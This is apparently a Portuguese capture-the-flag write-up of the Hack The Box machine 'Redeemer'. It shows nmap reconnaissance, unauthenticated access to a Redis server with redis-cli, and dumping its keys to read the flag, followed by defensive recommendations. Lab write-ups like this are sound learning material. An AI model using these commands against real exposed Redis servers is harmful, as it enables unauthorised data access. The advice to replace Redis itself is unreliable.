# HTB - Redeemer

**Plataforma:** Hack the Box

**Máquina:** Redeemer

**Data:** 15/10/25

**Objetivo:** Capturar a flag

---

## 1 - Descrição

A maquina alvo usa um serviço **redis**, é um servidor baseado em tabelas, ele por padrão fica na porta 6379.
**IP do alvo:**  10.129.35.253

---

## 2 - Reconhecimento

### =Varredura de Portas=
Já que eu sabia qual porta eu deveria procurar, em vez de perder tempo eu escanei a porta padrão do serviço redis:

```bash
nmap -sV -p 6379 10.129.35.253
```

O resultado desse scan foi:
```bash
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value 5.0.7
```

Como podemos ver a porta do serviço Redis esta aberta

---

## 3 - Exploração

### =Serviço Redis=
Comando usado pra conectar no servidor redis é:

```bash
redis-cli -h 10.129.35.253
```

Conectado no servidor, eu usei o comando  KEYS * esse comando lista todas as keys salvas no servidor, depois de conectar e usar o comando KEYS * , o terminal fica assim:

```bash
10.129.35.253> KEYS *
1) "flag"
2) "stor"
3) "numb"
4) "temp"
```

Ali estava a key que precisavamos, a key "flag", agora usei o comando GET, pra mostrar o valor da key "flag"

```bash
10.129.35.253> GET flag
"<VALOR DA FLAG>"
```

E assim consegui a flag da máquina :)

---

## Vulnerabilidades

- Serviço Redis exposto na rede
- Não precisa de senha pra conectar no servidor como root
- Protocolo desatualizado

## Recomendações de Segurança

- Usar um serviço mais atual do que o redis
- Usar sempre senha pra seus serviços
- Usar um firewall bem configurado pra não deixar portas expostas

---

## Conclusão

Essas últimas 4 máquinas que fiz, todas as vulnerabilidades eram falta de senhas, então pude aprender que uma senha boa é um dos melhores jeitos de se prevenir, mas não coloque senhas obvias ou só feitas de números, pois um ataque brute force consegue invadir isso, mas eu gostei dessa